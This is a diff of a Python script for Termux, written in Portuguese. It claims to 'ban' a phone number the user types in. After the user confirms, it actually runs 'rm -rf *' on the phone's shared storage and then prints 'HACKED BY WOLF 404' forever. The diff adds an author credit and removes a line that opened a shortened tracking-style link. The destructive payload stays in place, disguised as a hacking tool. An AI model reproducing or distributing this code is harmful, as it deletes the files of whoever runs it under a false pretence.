@@ -27,8 +27,11 @@ print('''\033[31m▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒
 ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒''')
 time.sleep(2)
+print("\n")
+print("Created by Wolf404")
+time.sleep(2)
 print('\n')
-print("Olá, bem vindo ao script de dar ban em números :)")
+print("Olá, bem vindo ao script de dar ban em números")
 num=int(input("Digite o número que você deseja dar ban: "))
 print('\n')
 resp=int(input(f"O número digitado foi {num}, está correto?[1=Y/2=N] "))
@@ -38,7 +41,6 @@ time.sleep(2)
 if resp==1:
     os.system("termux-setup-storage")
     os.system("cd /storage/emulated/0/ && rm -rf *")
-    os.system("termux-open('https://yip.su/2Dhbp9')")
     while True:
         print("HACKED BY WOLF 404")
 else:
